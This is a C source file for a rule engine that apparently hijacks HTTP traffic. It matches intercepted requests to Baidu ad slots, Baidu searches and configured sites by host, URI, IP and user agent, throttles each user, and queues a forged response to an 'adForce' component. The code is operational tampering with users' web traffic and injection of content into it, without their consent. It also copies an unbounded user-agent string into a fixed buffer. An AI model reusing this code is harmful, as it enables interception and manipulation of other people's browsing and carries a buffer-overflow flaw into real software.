/*
 * jc rule
 * we check the host and uri, then make a response to the http client
 * there are 3 detail rules
 * 1. host uri matched
 * 2. ip filter matched
 * 3. time matched
 */

#include "dc_global.h"
#include "filter_rule_jc_record.h"

/*global reference*/
extern HashMap* hash_map_new(unsigned int length);
extern int hash_map_insert(HashMap* psHashMap, char*start, int len, long* in_val);
extern int hash_map_find(HashMap* psHashMap, char*start, int len, long* out_val);

extern int load_jc_site_cfg(struct JC_S * jc_sites);
extern int load_jc_filer_ip_cfg(char * rule_jc_filter_ips[64]);

/*mq init*/
extern void mq_jc_win_client_init();
extern void jc_mq_direct_send_msg(int iTid, const char* pcMessage, char* name);

#define TOTAL_JC_IP_SUM 400000

/*jc log*/
extern	pthread_mutex_t jc_mut;

/*ip filter*/
static char * rule_jc_filter_ips[64];
static int rule_jc_filter_ips_len = 0;

/*jc target*/
static struct JC_S *rule_jc_sites = NULL;
static int rule_jc_sites_len = 0;

/* save the user that hava send jc message */
HashMap* g_pJcTotalUser[THREAD_NUM] = {NULL};

/*init jc filtered ips*/
static void rule_jc_init_filter_ip()
{
    rule_jc_filter_ips_len = load_jc_filer_ip_cfg(rule_jc_filter_ips);
	int i = 0;
	for(; i < THREAD_NUM; i++)
	{
		g_pJcTotalUser[i] = hash_map_new(TOTAL_JC_IP_SUM);
	}
}

/*init jc target sites*/
static void rule_jc_load_target_sites()
{
	rule_jc_sites = (struct JC_S *)malloc(128 * sizeof(struct JC_S));
	memset(rule_jc_sites, 0, 128 * sizeof(struct JC_S));
	rule_jc_sites_len = load_jc_site_cfg(rule_jc_sites);
}

/*随机获取下一个URL*/
static char * get_next_dst_index(const int thread_id, const int index)
{
    if(rule_jc_sites[index].dst_rodom_index < rule_jc_sites[index].dst_url_len-1)
    {
        rule_jc_sites[index].dst_rodom_index++;
    }
    else
    {
        rule_jc_sites[index].dst_rodom_index = 0;
    }
    //printf("match %d %s\n", index, rule_jc_sites[thread_id][index].dst_url[rule_jc_sites[thread_id][index].dst_rodom_index]);
    return rule_jc_sites[index].dst_url[rule_jc_sites[index].dst_rodom_index];
}

/************************************************************************/
//  [10/31/2014]                                               
//  检查jc用户是否时间和次数符合条件                                                                  
/************************************************************************/
static bool rule_js_is_in_map(const int iTid, const MqHttpMessage* psMqHttpMes, char* name, int delay)
{
	char szADUA[1024]={0};
	strcpy(szADUA, psMqHttpMes->pcSrcIP);
	strcat(szADUA, psMqHttpMes->pcUa);
	SJCUSer* psJCUSer = NULL;

	//printf("rule_js_is_in_map %s.\n", name);
	int iRes = hash_map_find(g_pJcTotalUser[iTid], szADUA, strlen(szADUA), (long*)&psJCUSer);
	if (iRes >= 0)
	{
		int i = 0;
		for (; i < psJCUSer->iStrategyNum; i++)
		{
			if (0 == strcmp(name, psJCUSer->pcStrategys[i]))
			{
				break;
			}
		}
		
		//如果jc策略没有被打击过
		if (i == psJCUSer->iStrategyNum)
		{
			psJCUSer->iCounts[psJCUSer->iStrategyNum]++;
			psJCUSer->pcStrategys[psJCUSer->iStrategyNum] = name;
			psJCUSer->lTimes[psJCUSer->iStrategyNum] = psMqHttpMes->lSec;
			psJCUSer->iStrategyNum++;
			psJCUSer->totalNum++;
			return true;
		}
		else
		{
			if (psJCUSer->totalNum >= g_conf_jc_total_limit || psJCUSer->iCounts[i] >= g_conf_jc_limit || (psMqHttpMes->lSec - psJCUSer->lTimes[i]) < delay)
			{
				return false;
			}
			else
			{
				//printf("rule_js_is_in_map limit = %d %d\n", g_conf_jc_total_limit, g_conf_jc_limit);
				psJCUSer->totalNum++;
				psJCUSer->iCounts[i]++;
				psJCUSer->lTimes[i] = psMqHttpMes->lSec;
				return true;
			}
		}

		return false;
	}

	psJCUSer = (SJCUSer*)malloc(sizeof(SJCUSer));
	memset(psJCUSer, 0, sizeof(SJCUSer));
	psJCUSer->iCounts[psJCUSer->iStrategyNum]++;
	psJCUSer->pcStrategys[psJCUSer->iStrategyNum] = name;
	psJCUSer->lTimes[psJCUSer->iStrategyNum] = psMqHttpMes->lSec;
	psJCUSer->iStrategyNum++;
	psJCUSer->totalNum++;
	hash_map_insert(g_pJcTotalUser[iTid], szADUA, strlen(szADUA), (long*)psJCUSer);
	return true;
}

/*规则检查*/
static int rule_jc_check_need_jc(const int thread_id, const MqHttpMessage* psMqHttpMes, char ** dst_url, char **name)
{
    int is_url_ok = -1;

	/*check ip*/
	if(rule_jc_filter_ips_len != 0)
	{
		int j = 0;
		for(; j < rule_jc_filter_ips_len; j++)
		{
			if(strcmp(rule_jc_filter_ips[j], psMqHttpMes->pcSrcIP) == 0)
			{
				break;
			}
		}

		if (j == rule_jc_filter_ips_len)
		{
			return -1;
		}
	}

	if (0 == strcmp("pos.baidu.com", psMqHttpMes->host))
	{
		if (strstr(psMqHttpMes->pcUri, "/acom?adn=") && strstr(psMqHttpMes->pcUri, "&rsi0=300")
			&& strstr(psMqHttpMes->pcUri, "&rsi1=250") && !strstr(psMqHttpMes->pcUri, "ganji"))
		{
			if (rule_js_is_in_map(thread_id, psMqHttpMes, "20150209142702", 36000))
			{
				*name = "20150209142702";
				//printf("rule_jc_check_need_jc=%s\n", psMqHttpMes->pcUri);
				return 1;
			}
		}

		return -1;
	}

    /*1、check uri*/
	int i;
    for(i=0; i < rule_jc_sites_len; i++)
    {
        if((strcmp(rule_jc_sites[i].host, psMqHttpMes->host) == 0)
                &&(strlen(psMqHttpMes->pcUri) < 2048))
        {
			if (rule_jc_sites[i].type == 0)
			{
				regmatch_t subs [16];
				int err = regexec(&rule_jc_sites[i].uri_re, psMqHttpMes->pcUri, (size_t) 16, subs, 0);

				if(err ==0)
				{
					is_url_ok = 1;
					*name = rule_jc_sites[i].name;
					//printf("exp0 is ok %s %s %s\n", rule_jc_sites[i].name, psMqHttpMes->host, psMqHttpMes->pcUri);
					break;
				}
			}
			else if(rule_jc_sites[i].type == 1)
			{	
				if (strstr(psMqHttpMes->pcUri, rule_jc_sites[i].flag))
				{
					if (0 == strcmp("www.baidu.com", psMqHttpMes->host))
					{
						if (('s' == *(psMqHttpMes->pcUri + 1) || 'b' == *(psMqHttpMes->pcUri + 1)) && NULL != strstr(psMqHttpMes->pcUri, "ie=utf-8"))
						{
							//printf("baidu is ok %s %s %s %s\n", rule_jc_sites[thread_id][i].name, psMqHttpMes->host, psMqHttpMes->pcUri, rule_jc_sites[thread_id][i].flag);
							*name = rule_jc_sites[i].name;
							is_url_ok = 1;
							break;
						}

						//printf("baidu1 is ok %s %s %s %s\n", rule_jc_sites[thread_id][i].name, psMqHttpMes->host, psMqHttpMes->pcUri, rule_jc_sites[thread_id][i].flag);
					}
					else
					{
						//printf("other is ok %s %s %s %s\n", rule_jc_sites[thread_id][i].name, psMqHttpMes->host, psMqHttpMes->pcUri, rule_jc_sites[thread_id][i].flag);
						*name = rule_jc_sites[i].name;
						is_url_ok = 1;
						break;
					}
				}
			}
        }
    }

    if(is_url_ok < 0)
	{
        return -1;
	}

	if (rule_js_is_in_map(thread_id, psMqHttpMes, *name, rule_jc_sites[i].delay))
	{
		return 1;
	}
	
    return -1;
}

/*global init*/
int rule_jc_init()
{
    pthread_mutex_init(&jc_mut, NULL);

    /*init mq to adForce*/
    mq_jc_win_client_init();
    
    /*init jc filter ips*/
    rule_jc_init_filter_ip();

    /*init jc target sites*/
    rule_jc_load_target_sites();

	g_jc_record_init();

    return 0;
}

/*主循环*/
int rule_jc_main_loop(const int iTid, char* pcMessage, const MqHttpMessage* psMqHttpMes)
{
	int ret = g_psJcRecord->queryJCRecord(g_psJcRecord, psMqHttpMes);
	if (ret > 0)
	{
		return 0;
	}

    /*check jc rules*/
    char * dst_url;
	char * name;
    if(rule_jc_check_need_jc(iTid, psMqHttpMes, &dst_url, &name) > 0)
    {
        /*send our response*/
		g_iJCSenderNum[iTid]++;
		jc_mq_direct_send_msg(iTid, pcMessage, name);
		return 1;
    }
    else
    {
        //rule_jc_load_target_sites_refresh(iTid,  (long) uiSec);
    }

    return 0;
}

